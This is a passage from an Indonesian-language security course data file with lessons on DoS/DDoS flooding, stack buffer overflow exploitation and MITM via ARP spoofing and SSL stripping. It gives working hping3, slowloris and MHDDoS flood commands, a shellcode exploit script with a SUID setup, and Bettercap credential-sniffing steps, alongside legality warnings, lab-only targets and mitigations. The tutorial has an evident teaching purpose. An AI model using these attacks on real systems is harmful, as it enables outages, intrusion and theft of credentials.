    caraKerja: '1) <strong>SYN Flood</strong>: attacker kirim ribuan packet SYN (minta handshake) tapi tidak pernah kirim ACK balik. Server pegang "koneksi setengah jadi" di memory → habis → crash / hang.<br/>2) <strong>UDP Flood</strong>: kirim UDP packet besar ke port random. Server coba respon ICMP unreachable → bandwidth habis.<br/>3) <strong>HTTP Flood</strong>: kirim ribuan GET / POST request HTTP yang sah tapi mahal. Server kewalahan proses.<br/>4) <strong>Slowloris</strong>: buka koneksi HTTP, kirim header sangat perlahan (1 byte per beberapa detik). Server pegang koneksi lama → new connection ditolak.',
    asciiDiagram: `SYN FLOOD:

Penyerang ──► SYN ──► Server: "setuju, ini SYN-ACK untukmu"
              │             │
              │             │ tunggu ACK dari client...
              │             │ (penyerang TIDAK kirim ACK)
              │             │
              │ 1000 SYN berikutnya ──►
              │
Server: connection table PENUH → ❌ reject user sah

SLOWLORIS:

Browser ──► GET / HTTP/1.1 ──► Server (buka socket)
Browser ──► User-Agent: M─────► Server (tunggu header lengkap, 5 detik)
Browser ──► O─────────────► (kirim pelan-pelan, jangan tutup)
Browser ──► Z──────────────►
Server: socket digaruk 500 koneksi Slowloris → COLAPSE`,
    tools: {
      pc: 'hping3 (sudo apt install hping3), MHDDoS (pip install), Slowloris (pip install slowloris), LOIC (Windows GUI), GoldenEye.',
      hp: 'Termux + MHDDoS via pip. Untuk IoT DDoS simulation (hanya lab), bisa pakai Android tool terbatas.'
    },
    prerequisites: [
      'Sangat paham: Anda HANYA boleh DDoS server yang Anda MILIKI SENDIRI. DDoS tanpa izin = PIDANA',
      'Paham konsep TCP/IP, 3-way handshake',
      'Paham HTTP request & response',
      'Punya Linux / Kali Linux',
    ],
    pcSteps: [
      { judul: '⚠️ TENTANG LEGALITAS - BACA INI DULU', isi: 'DoS/DDoS ke server yang BUKAN milik kamu = ILEGAL bahkan kalau cuma "test". Di banyak negara (termasuk Indonesia via UU ITE), ini pidana 6-12 tahun.<br/><br/>Cara legal berlatih:<br/>1) Setup VPS / server lab milik sendiri<br/>2) Dapat izin tertulis dari pemilik server<br/>3) Gunakan platform legal seperti CyberDefenders atau test lab SecurityTrails<br/>4) Honeypot milik sendiri<br/><br/>Tutorial ini menggunakan target "scanme.nmap.org" hanya untuk NMAP (bukan DoS), dan SERVER LOKAL KAMU SENDIRI untuk testing.' },
      { judul: 'Install tools', isi: 'Install tools yang akan dipakai: <pre><code>sudo apt update\nsudo apt install hping3 apache2-utils -y\npip install slowloris MHDDoS</code></pre>' },
      { judul: 'Setup target lab sendiri', isi: 'Buka terminal kedua. Install Apache + load halaman ringan: <pre><code>sudo apt install apache2 -y\necho "&lt;h1&gt;Target Latihan DoS&lt;/h1&gt;" | sudo tee /var/www/html/index.html\nsudo systemctl start apache2</code></pre>Cek IP lokal: <code>hostname -I</code> (misal 192.168.1.100). Ini TARGET LAB kamu sendiri.' },
      { judul: 'SYN Flood dengan hping3', isi: 'Di terminal pertama (attacker): <pre><code>sudo hping3 -S --flood -p 80 192.168.1.100</code></pre>Penjelasan: <code>-S</code> (SYN flag), <code>--flood</code> (kirim secepat mungkin, no display), <code>-p 80</code> (port HTTP target). <br/><br/>Lihat di terminal kedua (target): jalankan <code>ss -tan | grep SYN_RECV | wc -l</code> — jumlah koneksi SYN_RECV akan melonjak. <code>top</code> — load CPU server target akan spike.' },
      { judul: 'Lihat efek & stop', isi: 'Buka browser di PC ketiga / HP — akses <code>http://192.168.1.100</code>. Seharusnya loading sangat lambat atau timeout. 🎉 DoS confirmed (hanya di lab sendiri).<br/><br/>Stop attack: tekan <code>Ctrl + C</code> di terminal attacker. Tunggu 30 detik agar server recover.' },
      { judul: 'UDP Flood', isi: 'Untuk UDP flood: <pre><code>sudo hping3 --udp --flood --rand-source -p 53 192.168.1.100</code></pre>Penjelasan: <code>--udp</code> (UDP packet), <code>--flood</code> (full speed), <code>--rand-source</code> (random source IP untuk sulit di-block). Target: port 53 (DNS, biasanya UDP).' },
      { judul: 'Slowloris attack', isi: 'Slowloris lebih rendah traffic tapi tetap efektif: <pre><code>slowloris 192.168.1.100 -p 80 -s 500</code></pre>Penjelasan: <code>-s 500</code> = buka 500 socket parsial bersamaan. Server pegang 500 koneksi yang never finish. <br/><br/>Lihat efek: coba akses server normal → timeout / sangat lambat.' },
      { judul: 'HTTP Flood dengan MHDDoS', isi: 'Untuk HTTP-level flood yang lebih targeted: <pre><code>python3 start.py GET http://192.168.1.100 50 100</code></pre>Penjelasan: method GET, target URL, 50 threads, 100 requests/thread = 5000 total request. POWERFUL untuk testing.' },
      { judul: 'Apa bedanya DoS vs DDoS?', isi: 'DoS: 1 sumber attack (laptop kamu). DDoS: ribuan sumber (botnet dari IoT compromised, sewa dari "stresser" ilegal).<br/><br/>Contoh botnet terkenal:<br/>• <strong>Mirai</strong> (2016) — 1.2 Tbps, sumber dari IoT (kamera CCTV, router)<br/>• <strong>WireX</strong> (2017) — dari Android phones yang install "media player" malware<br/>• <strong>Meris</strong> (2021) — MikroTik routers jadi botnet<br/><br/>💡 Untuk "test" kekuatan pertahanan, beberapa provider punya "stress testing" legal berbayar (misal CrowdSec, dan beberapa bug bounty juga include DoS testing).' },
    ],
    hpSteps: [
      { judul: 'Install Termux + tools', isi: 'Install Termux dari F-Droid, lalu: <pre><code>pkg update -y && pkg upgrade -y\npkg install python git nmap -y\ngit clone https://github.com/MatrixTM/MHDDoS\ncd MHDDoS && pip install -r requirements.txt</code></pre>' },
      { judul: 'Jalankan attack dari HP ke target lab sendiri', isi: '<pre><code>python3 start.py GET http://192.168.1.100 30 50</code></pre>30 threads, 50 req = 1500 request. Lakukan ke server lab kamu sendiri di jaringan.' },
      { judul: 'Monitor efek di HP', isi: 'Buka Chrome HP → akses <code>http://192.168.1.100</code>. Apakah sangat lambat? Buka Termux → <code>ping 192.168.1.100</code> apakah latency tinggi / packet loss?' },
    ],
    bedahCommand: [
      {
        command: 'sudo hping3 -S --flood -p 80 TARGET',
        penjelasan: [
          { flag: 'sudo', arti: 'Run sebagai root (perlu raw socket access)' },
          { flag: 'hping3', arti: 'Tool untuk craft & kirim packet TCP/IP custom' },
          { flag: '-S', arti: 'Set SYN flag (S = SYN,SA = SYN-ACK,A = ACK)' },
          { flag: '--flood', arti: 'Kirim secepat mungkin (tidak ada display real-time)' },
          { flag: '-p 80', arti: 'Port tujuan target (80 = HTTP, 443 = HTTPS)' },
        ]
      },
      {
        command: 'slowloris TARGET -p 80 -s 500',
        penjelasan: [
          { flag: 'slowloris', arti: 'Program Slowloris attack' },
          { flag: 'TARGET', arti: 'Hostname atau IP target' },
          { flag: '-p 80', arti: 'Port target' },
          { flag: '-s 500', arti: 'Jumlah socket parsial bersamaan (default 150)' },
        ]
      },
    ],
    troubleshooting: [
      { masalah: '❌ "hping3: operation not permitted"', solusi: 'Butuh root akses. Pakai <code>sudo</code> di Linux, atau jalankan di Kali Linux. Untuk Windows: pakai WSL.' },
      { masalah: '❌ Tidak terlihat efek di target', solusi: 'Target terlalu kuat (high spec, atau ada rate limiting). Gunakan setup lab sendiri, atau naikkan jumlah thread.' },
      { masalah: '❌ IP kamu kena block oleh ISP', solusi: 'Untuk lab, pakai server lokal di LAN. Untuk WAN, hampir semua ISP blok port flood keluar. VPN mungkin juga limit.' },
      { masalah: '❌ "Connection refused" atau "no route to host"', solusi: 'Pastikan IP target benar. Ping dulu: <code>ping TARGET</code>. Pastikan firewall target tidak memblokiren SYN ke server lain.' },
    ],
    mitigasi: 'Pertahanan dari DDoS:<br/><br/>1) <strong>CDN + Anycast Network</strong>: Cloudflare / Akamai / AWS CloudFront distribusi traffic ke 100+ POP global. Serangan 100 Gbps terserap tanpa sentuh server asli.<br/>2) <strong>Rate Limiting</strong>: batasi req/detik per IP. Nginx: <code>limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;</code><br/>3) <strong>Network-level filtering</strong>: upstream provider (ISP / hosting) bisa filter SYN flood via BGP blackhole atau scrubbing center.<br/>4) <strong>Captcha / JS Challenge</strong>: saat ada lonjakan traffic, tampilkan JavaScript challenge (Cloudflare challenge, Google reCAPTCHA) → traffic bot gagal.<br/>5) <strong>Web Application Firewall</strong>: WAF modern (ModSecurity, Cloudflare WAF) detect pola attack HTTP.<br/>6) <strong>Auto-scaling</strong>: cloud dengan auto-scale (AWS, GCP) bisa menambah instance saat traffic naik. Tapi ini mahal.<br/>7) <strong>Null routing / Blackhole</strong>: saat super parah, route traffic ke "black hole" (null route) untuk mitigasi darurat.<br/>8) <strong>SYN Cookies / Proxy</strong>: SYN cookie (Linux) atasi SYN flood tanpa track partial connection.',
    latihan: [
      '🔰 Setup VPS murah (DigitalOcean $4/bulan) + jalankan Slowloris dari PC kamu. Ukur kapan server mulai unresponsive.',
      '🟡 Konfigurasi Nginx dengan rate limiting di VPS lab, lalu DDoS dengan hping3. Apakah Nginx survive?',
      '🟡 Setup Cloudflare (free tier) untuk VPS lab kamu, lihat DDoS protection otomatis aktif.',
      '🔴 Pelajari BGP Anycast + scrubbing center (cari paper "Understanding DDoS Protection" di Cloudflare blog).',
      '🔴 Analisa sample PCAP dari Mirai botnet untuk paham traffic pattern (ada dataset publik untuk edukasi).',
    ],
    faq: [
      { q: 'Apa beda DoS, DDoS, dan stress test?', a: 'DoS = 1 sumber. DDoS = banyak. Stress test = tes beban untuk ukur kapasitas server (mirip DoS tapi TUJUAN dan LEGAL). Semua teknik SERUPA tapi intent dan izin menentukan legal.' },
      { q: 'Apakah hacked server kiddies bisa DDoS besar?', a: 'Stresser / booter services ilegal bisa dipakai siapa saja dengan $20/bulan. Ini sebabnya DDoS jadi sering — infrastructure cheap untuk attacke. Tapi target besar perlu mitigasi massive.' },
      { q: 'Apakah VPN melindungi dari DDoS?', a: 'VPN menutupi IP asal kamu, tapi tidak melindungi TARGET DDoS. Untuk protecting server, pakai CDN (Cloudflare) atau DDoS mitigation service.' },
      { q: 'Apa itu "DDoS for hire" legal?', a: 'TIDAK. Stress testing BOOTER/STRESER yang "accept any target" = ilegal. Legal alternative: penetration testing dengan izin ATAU DDoS testing service profesional dengan kontrak.' },
    ],
    ringkasan: [
      'DoS = 1 sumber attack. DDoS = ratusan-ribuan sumber (botnet)',
      'Jenis: Volume-based (bandwidth), Protocol (resource), Application (HTTP)',
      'Tool: hping3, Slowloris, MHDDoS, LOIC, GoldenEye',
      'Target latihan HANYA server sendiri / lab dengan izin tertulis',
      'Pertahanan terbaik saat ini: Cloudflare / Akamai / AWS Shield',
      'Defense in depth: Cloudflare (L7) + Firewall (L4) + Auto-scale + Rate limit',
      'Jangan menyerang target tanpa izin = PIDANA UU ITE',
    ],
    materiTerkait: ['Firewall & IDS/IPS', 'WAF Setup', 'Network Segmentation'],
  },
  25000, 35000, '🌊', 'sulit', 'serangan', false
);

// =========== 6. BUFFER OVERFLOW ===========
f('💥 Buffer Overflow — Tumpahkan Memori untuk Akses Penuh',
  {
    tujuan: 'Pahami konsep memory layout program C (stack, buffer, return address), bagaimana buffer overflow terjadi, cara membuat exploit sederhana pakai shellcode untuk mendapat shell, dan cara防御 modern (ASLR, Stack Canary, DEP/NX).',
    analogy: 'Bayangkan 10 rak buku di perpustakaan, masing-masing punya tinggi tetap 1 meter. Kamu taruh buku setebal 1.5 meter — buku itu "tumpah" menimpa rak di sebelahnya. Nah, di program komputer, tumpahan memori di stack bisa menimpa "alamat kembali" eksekusi program. Artinya attacker bisa "mengirim" program ke alamat memori pilihan mereka — alamat itu berisi shellcode untuk mendapat akses penuh ke komputer.',
    pengertian: 'Buffer Overflow adalah kerentanan di mana program membaca/menulis data melewati batas buffer yang dialokasikan, menimpa memori adjacent. Paling umum di bahasa C/C++ yang tidak otomatis cek batas (tidak seperti Java/Python).<br/><br/>Efeknya: attacker bisa overwrite return address di stack → CPU lompat eksekusi ke shellcode yang juga diinjeksi → program menjalankan perintah attacker alih-alih kembali ke caller. Ini pondasi banyak exploit (Morris Worm 1988, WannaCry 2017, EternalBlue).',
    caraKerja: '1) Program punya fungsi dengan buffer lokal:<pre><code>void vuln() {\n  char buf[64];\n  gets(buf);\n}</code></pre>2) <code>gets()</code> di C tidak cek panjang input. 3) Attacker kirim 64 byte padding + 4 byte return address palsu + shellcode. 4) Saat <code>vuln()</code> selesai, return ke address palsu milik attacker. 5) CPU eksekusi shellcode → spawn shell.',
    asciiDiagram: `STACK MEMORY SEBELUM VS SESUDAH:

SEBELUM overflow (input "hello"):
┌────────────────┐  ← high address
│ return addr    │  (alamat balik ke main)
├────────────────┤
│  buf[64]       │  ← tampung "hello\0"
└────────────────┘  ← low address

SESUDAH overflow (input 60 padding + 4 byte ret addr palsu):
┌────────────────┐
│ 0xdeadbeef    │  ← return addr ditimpa! CPU loncat ke sini
├────────────────┤
│ "AAAAAA...AA" │  ← padding (60 byte)
└────────────────┘  ← low address

Shellcode ditaruh di buffer atau setelah return addr.
CPU loncat ke shellcode → akses penuh!`,
    tools: {
      pc: 'GCC (compile program C), GDB (debugger), Python 3 + pwntools (eksploitasi), Metasploit (msfvenom untuk shellcode, pattern_create untuk cari offset).',
      hp: 'Buffer overflow exploit di HP sangat tidak praktis — pakai PC. HP cukup untuk baca & pelajari konsepnya.'
    },
    prerequisites: [
      'SANGAT penting: paham bahasa C dasar (pointer, array, function)',
      'Paham konsep memory: stack, heap, address',
      'Paham assembly x86 minimal (push, pop, call, ret)',
      'Punya Linux (Kali ideal)',
      '⚠️ Buffer overflow exploit ke software production = ilegal & merusak',
    ],
    pcSteps: [
      { judul: '⚠️ Disclaimer & Setup Lab', isi: 'Buffer overflow ke software production = merusak & ilegal. Lab ini menggunakan program C custom buatan sendiri yang SENGaja vulnerable.<br/><br/>Disable beberapa proteksi sementara (HANYA di lab). Indonesian OS Linux yang aman sudah enable ASLR secara default — disable untuk sementara:<pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>Untuk aktifkan lagi nanti: <code>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</code>' },
      { judul: 'Buat program C vulnerable', isi: 'Buat file <code>vuln.c</code>: <pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void vuln() {
    char buf[64];
    printf("Address of buf: %p\\n", buf);
    gets(buf);
    printf("You typed: %s\\n", buf);
}
int main() {
    vuln();
    return 0;
}</code></pre>Compile tanpa proteksi: <pre><code>gcc -fno-stack-protector -z execstack -o vuln vuln.c
sudo chown root vuln && sudo chmod 4755 vuln</code></pre>Penjelasan flag: <code>-fno-stack-protector</code> (matikan stack canary), <code>-z execstack</code> (izinkan eksekusi di stack).' },
      { judul: 'Jalankan & cari alamat buffer', isi: 'Jalankan program: <pre><code>./vuln</code></pre>Program akan cetak alamat buffer (misal <code>0xffffd860</code>). Catat / screenshot alamat ini — ini alamat yang AKAN jadi target shellcode. <br/><br/>Cara cepat: jalankan 1000x via Python: <pre><code>for i in $(seq 1 1000); do ./vuln &lt; /dev/null; done 2&gt;&dev/null | grep "Address" | sort -u</code></pre>Lihat rentang alamat yang muncul.' },
      { judul: 'Cari offset: pattern_create + crash analysis', isi: 'Gunakan Metasploit pattern_create untuk generate pola unik: <pre><code>msf-pattern_create -l 200</code></pre>Output panjang string seperti "Aa0Aa1Aa2Aa3..." disalin. Jalankan program dengan input itu: <pre><code>./vuln &lt;&lt;&lt; "Aa0Aa1..."</code></pre>Program crash dengan output "Segmentation fault".' },
      { judul: 'Identifikasi EIP/RIP yang ditimpa', isi: 'Jalankan dengan GDB: <pre><code>gdb ./vuln
(gdb) run &lt;&lt;&lt; "Aa0Aa1..."
(gdb) info registers</code></pre>Lihat register EIP (di x86) atau RIP (di x64). Nilai EIP-nya adalah substring dari pattern. Gunakan pattern_offset untuk cari tau berapa byte offset: <pre><code>msf-pattern_offset -q 0x63413263</code></pre>(ganti 0x... dengan nilai EIP yang muncul). Hasilnya: misal offset = 76. Artinya setelah 76 byte, return address dimulai.' },
      { judul: 'Generate shellcode dengan msfvenom', isi: 'Generate shellcode x86 Linux untuk spawn shell: <pre><code>msfvenom -p linux/x86/exec CMD=/bin/sh -f python</code></pre>Output adalah string bytes Python misal: <pre><code>buf = b"\\x31\\xc0\\x50\\x68..."  # panjang ~100 byte</code></pre>Copy ke file / script Python.' },
      { judul: 'Tulis exploit script', isi: 'Buat <code>exploit.py</code>: <pre><code>import sys
import struct
padding = b"A" * 76
ret_addr = struct.pack("&lt;I", 0xffffd860)  # &lt;- alamat buffer kamu
nop = b"\\x90" * 50  # NOP sled: 50 byte "do nothing"
shellcode = b"\\x31\\xc0..."  # dari msfvenom
payload = padding + ret_addr + nop + shellcode
sys.stdout.buffer.write(payload)</code></pre>Simenkan ke program vulnerable via piping: <pre><code>python3 exploit.py | ./vuln</code></pre>' },
      { judul: '🎉 DAPATKAN SHELL!', isi: 'Kalau alamat buffer benar, output: <code>You typed: AAAAAAA...∩ </code> lalu langsung spawn <strong>shell</strong>. Coba ketik <code>whoami</code>, <code>id</code>, <code>ls /</code>. 🎉<br/><br/>Itu artinya kamu sekarang punya akses shell di komputer sendiri! Inilah yang attacker dapatkan jika exploit berhasil di software cible.' },
    ],
    hpSteps: null,
    bedahCommand: [
      {
        command: 'gcc -fno-stack-protector -z execstack -o vuln vuln.c',
        penjelasan: [
          { flag: 'gcc', arti: 'GNU Compiler — compile C code jadi binary' },
          { flag: '-fno-stack-protector', arti: 'Matikan proteksi stack canary (untuk lab)' },
          { flag: '-z execstack', arti: 'Izinkan stack dieksekusi sebagai kode (untuk shellcode)' },
          { flag: '-o vuln', arti: 'Output binary name = vuln' },
        ]
      },
      {
        command: 'msf-pattern_create -l 200',
        penjelasan: [
          { flag: 'msf-pattern_create', arti: 'Tool Metasploit untuk generate pola unik' },
          { flag: '-l 200', arti: 'Panjang pola = 200 byte' },
        ]
      },
      {
        command: 'msfvenom -p linux/x86/exec CMD=/bin/sh -f python',
        penjelasan: [
          { flag: 'msfvenom', arti: 'Tool Metasploit untuk generate shellcode/payload' },
          { flag: '-p linux/x86/exec', arti: 'Payload: exec untuk Linux x86' },
          { flag: 'CMD=/bin/sh', arti: 'Command yang akan dijalankan = spawn shell' },
          { flag: '-f python', arti: 'Format output: Python bytes string' },
        ]
      },
    ],
    troubleshooting: [
      { masalah: '❌ "Segmentation fault" terus / tidak dapat shell', solusi: 'Alamat buffer berubah-ubah (ASLR). Disable ASLR: <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code>. Atau pakai teknik "return to libc" (lebih advanced).' },
      { masalah: '❌ Shellcode does not run (segfault di tengah shellcode)', solusi: 'Stack mungkin tidak executable di sistem modern. Pakai msfvenom dengan encoder (-e x86/shikata_ga_nai) atau teknik ROP (Return-Oriented Programming).' },
      { masalah: '❌ Tidak bisa compile program C', solusi: 'Install gcc: <code>sudo apt install gcc -y</code>. Atau pakai <code>clang</code>.' },
      { masalah: '❌ GDB menunjukkan "permission denied"', solusi: 'Program perlu SUID: <code>sudo chown root vuln && sudo chmod 4755 vuln</code>.' },
    ],
    mitigasi: 'Pertahanan dari Buffer Overflow:<br/><br/>1) <strong>Bukan pakai bahasa C/C++ untuk program baru</strong>: pakai Rust (memory safe by design), Go, atau managed language (Java, C#, Python). Untuk program C/C++ legacy, lakukan code review ketat.<br/>2) <strong>ASLR (Address Space Layout Randomization)</strong>: kernel mengacak layout memori saat program start. Attacker tidak bisa tebak alamat pasti. Linux sudah default enable.<br/>3) <strong>Stack Canary</strong>: taruh nilai random antara buffer dan return address. Saat return, cek apakah canary masih sama. GCC default sudah pakai <code>-fstack-protector-strong</code>.<br/>4) <strong>DEP / NX (No-Execute)</strong>: tandai stack sebagai non-executable. Shellcode di stack tidak bisa dieksekusi. Hardware-enforced di CPU modern (NX bit).<br/>5) <strong>FORTIFY_SOURCE</strong>: <code>_FORTIFY_SOURCE=2</code> mengganti fungsi unsafe (strcpy → strncpy dengan cek panjang).<br/>6) <strong>CFI (Control-Flow Integrity)</strong>: compile dengan <code>-fsanitize=cfi</code> agar indirect call/cjump diverifikasi runtime.<br/>7) <strong>Sandboxing</strong>: jalankan program vulnerable di container / sandbox (Docker, seccomp, AppArmor).',
    latihan: [
      '🔰 Kompile program <code>vuln.c</code> default (dengan semua proteksi) dan coba exploit — apa yang terjadi?',
      '🔰 Pelajari bahasa Rust dan tulis ulang program vulnerable di Rust. Apakah masih bisa di-overflow?',
      '🟡 Coba teknik Return-Oriented Programming (ROP) untuk bypass NX bit di program vulnerable.',
      '🟡 Pelajari CVE-2017-0144 (EternalBlue) — exploit SMBv1 yang dipakai WannaCry. Pahami kenapa bisa kena.',
      '🔴 Pelajari tentang format string vulnerability & use-after-free (variasi memory corruption lain).',
    ],
    faq: [
      { q: 'Apakah Buffer Overflow masih relevan di 2024?', a: 'Sayangnya ya. Setiap tahun masih ditemukan kerentanan baru di software C/C++ (router, IoT, driver). CVE-2021-3156 (Sudo Baron Samedit), CVE-2021-3159 (Peachtree).' },
      { q: 'Kenapa tidak pakai bahasa aman saja?', a: 'Idealnya memang begitu. Tapi banyak codebase legacy puluhan juta baris C (kernel Linux, server seperti Nginx, database). Plus bahasa seperti Rust belum se-mature ekosistem untuk semua use case.' },
      { q: 'Apa bedanya buffer overflow & stack overflow?', a: 'Sama. "Stack overflow" sering digunakan untuk menyebut buffer overflow yang terjadi di stack (paling umum). Buffer overflow juga bisa di heap.' },
      { q: 'Apakah saya bisa dapat shell dari HP via exploit ini?', a: 'Tidak praktis. ARM (HP) ≠ x86 (PC). Shellcode-nya beda. Tools exploit juga butuh debugger. Tetap di PC untuk lab.' },
    ],
    ringkasan: [
      'Buffer Overflow = tulis data lewat batas → timpa return address → eksekusi shellcode',
      'Tool wajib: GCC, GDB, msfvenom, pwntools',
      'Tipe: stack smash (paling umum), heap overflow, format string, use-after-free',
      'Proteksi modern: ASLR + Stack Canary + DEP/NX + FORTIFY_SOURCE',
      'Mitigasi arsitektur: pindah ke bahasa memory-safe (Rust)',
      'CVE bersejarah: Morris Worm 1988, Code Red 2001, WannaCry 2017',
      'Lab wajib: disable ASLR + compile tanpa canary + execstack',
    ],
    materiTerkait: ['Secure Coding', 'Firewall & IDS/IPS', 'Incident Response'],
  },
  25000, 35000, '💥', 'sulit', 'serangan', false
);

// ======================= MATERI 7-15 SERANGAN =======================

// =========== 7. MITM ===========
f('🕵️ Man-in-the-Middle (MITM) — Sadap Komunikasi di Tengah Jalan',
  {
    tujuan: 'Paham konsep MITM, cara kerja ARP spoofing + SSL stripping dengan Bettercap, dampaknya (kredensial bocor di WiFi publik), dan cara防御 pakai HTTPS, VPN, HSTS.',
    analogy: 'Bayangkan kamu kirim surat ke temen lewat pos. Normalnya surat langsung diantar. MITM itu kayak ada orang yang nyamar jadi tukang pos — buka suratmu, baca isinya, copy, lalu tutup lagi dan kirim ke temenmu. Temenmu dapat surat, kamu dapat surat, tapi orang tengah sudah tahu isinya. Bahkan dia bisa ubah isinya diam-diam.',
    pengertian: 'Man-in-the-Middle (MITM) adalah serangan di mana attacker menyisipkan dirinya di antara komunikasi dua pihak (misal client-server). Kedua pihak merasa bicara langsung satu sama lain, tapi sebenarnya semua data lewat attacker dulu.<br/><br/>MITM paling sering terjadi di WiFi publik (kafe, bandara, hotel) — attacker buat hotspot palsu atau ARP-spoofing jaringan agar semua traffic lewat laptopnya.',
    caraKerja: '1) <strong>ARP Spoofing</strong>: attacker kirim ARP reply palsu ke target & gateway, mengklaim "IP gateway adalah MAC address saya". Target mengira attacker = router. Semua traffic target lewat attacker.<br/>2) <strong>SSL Stripping</strong>: HTTPS di-downgrade ke HTTP oleh attacker (proxy transparan). User login di HTTP plain = password tertangkap.<br/>3) <strong>DNS Spoofing</strong>: attacker jawab query DNS palsu, arahkan user ke server attacker.',
    asciiDiagram: `NORMAL:
[Klien] ──── HTTPS ────► [Server ↔ asli]

SETELAH MITM:
[Klien] ── HTTP (downgrade) ──► [Attacker] ── HTTPS ──► [Server]
            "login di sini"  → semua lewat attacker →
            password tertangkap di tengah`,
    tools: {
      pc: 'Bettercap (sudo apt install bettercap), Wireshark, Ettercap (alternatif). Adapter WiFi yang support monitor mode (untuk advanced).',
      hp: 'Termux + arpspoof + nmap. Untuk HP tanpa root, fitur terbatas.'
    },
    prerequisites: [
      'Paham konsep ARP, MAC address, dan IP',
      'Paham HTTPS vs HTTP',
      'Punya Linux (Kali recommended)',
      'Lab HANYA di jaringan sendiri / lab izin'
    ],
    pcSteps: [
      { judul: '⚠️ Hanya untuk lab sendiri!', isi: 'MITM ke traffic orang lain = ilegal (UU ITE). Lab ini WAJIB dijalankan di:<br/>• Jaringan labisolasi<br/>• Komputer & device sendiri yang setuju untuk di-test<br/>• Lab legal (security lab universitas / perusahaan dengan izin)<br/><br/>Server admin boleh memonitor jaringannya sendiri, tapi BUKAN traffic orang lain.' },
      { judul: 'Install Bettercap', isi: '<pre><code>sudo apt update\nsudo apt install bettercap</code></pre>' },
      { judul: 'Cek interface & target', isi: 'Cek interface jaringan kamu: <pre><code>ip addr show</code></pre>Catat nama interface (eth0 / wlan0). Cek IP target di jaringan: <pre><code>sudo arp-scan --localnet || sudo nmap -sn 192.168.1.0/24</code></pre>(Install arp-scan jika belum.)' },
      { judul: 'Jalankan Bettercap', isi: '<pre><code>sudo bettercap -iface wlan0</code></pre>(ganti sesuai interface kamu. Untuk Ethernet: <code>-iface eth0</code>)' },
      { judul: 'Enable network probe', isi: 'Di console Bettercap, ketik: <pre><code>net.probe on\nnet.show</code></pre>Setelah 30-60 detik, akan muncul tabel semua host di jaringan: IP, MAC, vendor.' },
      { judul: 'Set target ARP spoof', isi: 'Pilih IP target (misal HP sendiri yang kamu pakai untuk test). Set target: <pre><code>set arp.spoof.targets 192.168.1.105\narp.spoof on</code></pre>Sekarang semua traffic target melawati kamu. Juga spoof gateway: <pre><code>set arp.spoof.targets 192.168.1.105,192.168.1.1</code></pre>(IP router biasanya akhiran .1)' },
      { judul: 'Sniff traffic', isi: 'Aktifkan sniffer: <pre><code>net.sniff on</code></pre>Bettercap akan capture semua packet. Buka terminal kedua, jalankan Wireshark untuk visualize: <pre><code>sudo wireshark</code></pre>Filter: <code>http.cookie</code> atau <code>http.request.uri contains login</code>.' },
      { judul: 'SSL Strip', isi: 'Untuk downgrade HTTPS ke HTTP: <pre><code>set http.proxy.sslstrip true\nhttp.proxy on</code></pre>Minta target buka situs login HTTP (misal forum sederhana yang masih pakai HTTP). Cek Wireshark → username & password akan muncul plaintext! (Hanya untuk lab yang Anda kontrol penuh.)' },
      { judul: 'Stop & cleanup', isi: 'Stop Bettercap: <pre><code>arp.spoof off\nnet.sniff off\nhttp.proxy off\nexit</code></pre>Bersihkan cache ARP target bisa dengan restart device target.' },
    ],
    hpSteps: [
      { judul: 'Install Termux tools', isi: '<pre><code>pkg update -y && pkg upgrade -y\npkg install python nmap dsniff -y</code></pre>' },
      { judul: 'Scan target di jaringan', isi: '<pre><code>nmap -sn 192.168.1.0/24</code></pre>Cari IP device target (HP yang akan di-test untuk lab).' },
      { judul: 'Jalankan ARP spoof dari HP', isi: '<pre><code>arpspoof -i wlan0 -t TARGET_IP GATEWAY_IP</code></pre>Traffic HP target sekarang lewat HP kamu.' },
      { judul: 'Monitor di Wireshark (PC)', isi: 'Di PC yang satu jaringan, buka Wireshark → filter IP target → lihat traffic HTTP. Username/password plain akan muncul.' }
    ],
    bedahCommand: [
      {
        command: 'set arp.spoof.targets 192.168.1.105',
        penjelasan: [
          { flag: 'set', arti: 'Set konfigurasi variable Bettercap' },
          { flag: 'arp.spoof.targets', arti: 'Module ARP spoof: target IP yang akan di-spoof' },
          { flag: '192.168.1.105', arti: 'IP address target (HP/laptop korban di lab)' }
        ]
      },
      {
        command: 'set http.proxy.sslstrip true',
        penjelasan: [
          { flag: 'http.proxy', arti: 'Module HTTP proxy di Bettercap' },
          { flag: 'sslstrip', arti: 'Sub-module: downgrade HTTPS ke HTTP' },
          { flag: 'true', arti: 'Aktifkan ssl-stripping' }
        ]
      }
    ],
    troubleshooting: [
      { masalah: '❌ "operation not permitted" dari Bettercap', solusi: 'Butuh root. Jalankan dengan sudo. Atau di Termux perlu HP rooted.' },
      { masalah: '❌ Target tidak ter-spoof (arp.cache tetap benar)', solusi: 'Bettercap mengirim reply ARP dari IP sendiri. Pastikan interface benar (<code>net.show</code> untuk lihat).' },
      { masalah: '❌ "no targets found"', solusi: 'Periksa scope network probe. Pastikan target hidup (ping dulu). Bisa juga switch ke Ettercap.' },
      { masalah: '❌ HSTS membuat SSL Strip gagal', solusi: 'Ini normal — website modern (Google, Bank) pakai HSTS. SSL strip hanya efektif untuk situs tanpa HSTS (HTTP-only legacy).' }
    ],
    mitigasi: 'Cara mempertahankan diri dari MITM:<br/><br/>1) <strong>HTTPS Everywhere</strong>: semua situs WAJIB HTTPS. Jangan pernah login di HTTP.<br/>2) <strong>HSTS (HTTP Strict Transport Security)</strong>: header <code>Strict-Transport-Security: max-age=31536000</code> = browser selalu gunakan HTTPS, bahkan jika user ketik HTTP.<br/>3) <strong>Certificate Pinning</strong>: app mobile (bukan web) bisa hardcode certificate fingerprint server. Cegah MITM bahkan jika ada CA palsu.<br/>4) <strong>VPN terpercaya</strong>: VPN mengenkripsi semua traffic ke VPN server, ISP/MITM tidak bisa baca. Pilih VPN yang punya track record privacy baik.<br/>5) <strong>Hindari WiFi publik tanpa VPN</strong>: di kafe/bandara, attacker bisa ARP semua user di WiFi. Selalu pakai VPN.<br/>6) <strong>ARP monitoring tools</strong>: beberapa IDS (Arpwatch, Wazuh) detect ARP spoof anomaly di jaringan internal.<br/>7) <strong>802.1X Authentication</strong>: port-based auth di switch — perangkat harus authenticate sebelum dapat akses jaringan.',
    latihan: [
